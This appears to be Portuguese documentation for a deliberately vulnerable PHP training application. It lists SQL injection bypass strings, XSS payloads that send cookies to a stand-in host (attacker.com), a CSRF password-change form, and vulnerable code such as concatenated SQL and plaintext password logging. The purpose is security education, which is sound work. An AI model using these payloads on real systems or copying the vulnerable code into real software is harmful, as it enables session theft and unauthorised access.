# 📖 Documentação Técnica Detalhada

## 🏗️ Arquitetura do Sistema

### Fluxo de Dados
```
Cliente (Browser) 
    ↓ HTTP Request
Servidor Web (Apache/Nginx)
    ↓ PHP Processing  
Aplicação (PHP Files)
    ↓ SQL Queries
Azure SQL Database
    ↓ Response
Cliente (JSON/HTML)
```

### Padrão de Arquivos
- **MVC Simplificado:** Views e Controllers mesclados nos arquivos PHP
- **Single Page Controllers:** Cada página é auto-contida
- **Shared Resources:** CSS e imagens centralizados

## 🔧 Configurações Técnicas

### Configuração do PHP
```ini
; Configurações recomendadas para desenvolvimento
display_errors = On
error_reporting = E_ALL
session.cookie_httponly = 1
session.use_strict_mode = 1
```

### Extensões PHP Necessárias
```bash
# Extensões obrigatórias
php_pdo
php_pdo_sqlsrv
php_sqlsrv
php_openssl
php_json
php_session
```

### Configuração Azure SQL Database
```sql
-- Configurações de servidor recomendadas
ALTER DATABASE [vulnerable_db] SET COMPATIBILITY_LEVEL = 150;
ALTER DATABASE [vulnerable_db] SET AUTO_CLOSE OFF;
ALTER DATABASE [vulnerable_db] SET AUTO_SHRINK OFF;
```

## 📊 Métricas e Performance

### Tempos de Resposta Típicos
- **Login:** ~200ms
- **Dashboard:** ~350ms (com modais)
- **Consultas DB:** ~50-100ms

### Otimizações Implementadas
- CSS minificado em arquivos separados
- Lazy loading de modais
- Consultas otimizadas com LIMIT/TOP

## 🧪 Cenários de Teste

### Testes de Vulnerabilidade

#### SQL Injection
```sql
-- Teste 1: Login bypass
Username: admin' OR '1'='1' --
Password: [qualquer]

-- Teste 2: Data extraction
Username: admin' UNION SELECT password FROM users --
```

#### XSS Testing
```html
<!-- Teste 1: Alert básico -->
<script>alert('XSS Test')</script>

<!-- Teste 2: Cookie stealing -->
<script>document.location='http://attacker.com/'+document.cookie</script>

<!-- Teste 3: DOM manipulation -->
<img src=x onerror="document.body.innerHTML='HACKED'">
```

#### CSRF Testing
```html
<!-- Formulário malicioso externo -->
<form action="http://target/dashboard.php" method="POST">
    <input type="hidden" name="action" value="update_profile">
    <input type="hidden" name="new_password" value="hacked123">
</form>
```

### Testes de Funcionalidade

#### Cenário 1: Fluxo Completo de Usuário
1. Acessar página inicial
2. Registrar novo usuário
3. Fazer login
4. Navegar pelo dashboard
5. Adicionar comentário
6. Visualizar estatísticas
7. Logout

#### Cenário 2: Teste de Responsividade
1. Desktop (1920x1080)
2. Tablet (768x1024)
3. Mobile (375x812)
4. Mobile pequeno (320x568)

## 🔒 Vulnerabilidades Detalhadas

### 1. SQL Injection (Alto Risco)

**Localização:** `database.php` - método `authenticateUser()`
```php
// VULNERÁVEL
$query = "SELECT * FROM users WHERE username = '$username' AND password_hash = '$password'";
```

**Exploit:**
```sql
username: admin' OR '1'='1' --
password: qualquer_coisa
```

**Impacto:** Bypass de autenticação, extração de dados

---

### 2. Stored XSS (Alto Risco)

**Localização:** `dashboard.php` - sistema de comentários
```php
// VULNERÁVEL - sem sanitização
$comment = $_POST['comment'];
$query = "INSERT INTO comments (content, user_id) VALUES ('$comment', $user_id)";
```

**Exploit:**
```html
<script>
    // Roubo de cookies
    fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

**Impacto:** Execução de código malicioso, roubo de sessão

---

### 3. Insecure Direct Object Reference (Médio Risco)

**Localização:** `dashboard.php` - acesso a dados de usuários
```php
// VULNERÁVEL - sem verificação de autorização
$user_id = $_GET['user_id'];
$query = "SELECT * FROM users WHERE id = $user_id";
```

**Exploit:**
```
GET /dashboard.php?action=get_user&user_id=1
GET /dashboard.php?action=get_user&user_id=2
```

**Impacto:** Acesso a dados de outros usuários

---

### 4. Sensitive Data Exposure (Alto Risco)

**Localização:** `database.php` - logs de login
```php
// VULNERÁVEL - senha em texto plano
public function logLoginAttempt($username, $password, $ip, $userAgent, $success) {
    $query = "INSERT INTO login_logs (username, password_attempted, ...) 
              VALUES ('$username', '$password', ...)";
}
```

**Impacto:** Exposição de credenciais tentadas

---

### 5. Cross-Site Request Forgery - CSRF (Médio Risco)

**Localização:** Todos os formulários
```html
<!-- VULNERÁVEL - sem token CSRF -->
<form method="POST" action="dashboard.php">
    <input type="hidden" name="action" value="update_profile">
    <!-- sem csrf_token -->
</form>
```

**Impacto:** Execução de ações não autorizadas

## 🛠️ Ferramentas de Desenvolvimento

### Debugging
```php
// Debug habilitado em desenvolvimento
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Log de queries SQL
echo "<!-- Query executada: $query -->";
```

### Ferramentas Recomendadas
- **Burp Suite:** Testes de segurança web
- **OWASP ZAP:** Scanner de vulnerabilidades
- **SQLMap:** Exploração de SQL Injection
- **Browser DevTools:** Debug frontend

## 📈 Roadmap de Melhorias

### Fase 1: Correções de Segurança (Educacional)
- [ ] Implementar versões "seguras" das funcionalidades
- [ ] Adicionar comentários explicativos sobre correções
- [ ] Criar toggle entre versão vulnerável/segura

### Fase 2: Novas Vulnerabilidades
- [ ] XML External Entity (XXE)
- [ ] Server-Side Request Forgery (SSRF)
- [ ] Deserialization attacks
- [ ] Authentication bypass methods

### Fase 3: Recursos Educacionais
- [ ] Tutorial interativo
- [ ] Explicações em tempo real
- [ ] Scoring system para descoberta de vulnerabilidades
- [ ] Relatórios de segurança automatizados

## 🎓 Recursos Educacionais

### Guias de Estudo
1. **OWASP Top 10 2021** - Mapeamento das vulnerabilidades
2. **SQL Injection Guide** - Técnicas e prevenção
3. **XSS Prevention Cheat Sheet** - Sanitização e validação
4. **Secure Coding Practices** - Boas práticas de desenvolvimento

### Exercícios Práticos
1. Identificar todas as vulnerabilidades presentes
2. Explorar cada vulnerabilidade encontrada
3. Propor correções para cada falha
4. Implementar melhorias de segurança

### Laboratórios Virtuais
- Ambiente Docker para isolamento
- VMs pré-configuradas
- Cenários de ataque simulados
- Análise forense pós-ataque

---

**📚 Documentação criada pela equipe FinSecure Educational**  
**🔄 Última atualização:** Dezembro 2024